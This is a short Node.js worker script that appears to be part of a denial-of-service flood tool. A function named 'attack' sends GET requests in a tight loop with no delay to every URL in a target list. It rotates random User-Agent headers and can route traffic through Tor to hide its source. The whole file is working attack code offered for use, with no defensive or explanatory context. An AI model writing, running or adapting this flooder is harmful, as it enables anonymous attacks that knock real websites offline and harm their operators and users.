const proxy =         require('tor-request');
const request =       require('request');     
const randomUseragent = require('random-useragent');
const {
     parentPort, workerData
  } =                   require('worker_threads');
const { urls, tor } = workerData;


const attack = (method, url) => {
    method({
        url,
        method: 'GET',
        headers: {
            'User-Agent': randomUseragent.getRandom()
        }
    }, (err, res) => {
        if (err) return parentPort.postMessage({ url, success: 'unsuccessfully' });
        if (res?.statusCode && res?.statusCode < 400) return parentPort.postMessage({ url, success: 'successfully' });
    });
}

if (tor) {
    setInterval(() => {
        urls.forEach(url => {
            attack(proxy.request, url);
        });
    });
} else {
    setInterval(() => {
        urls.forEach(url => {
            attack(request, url);
        });
    });
}
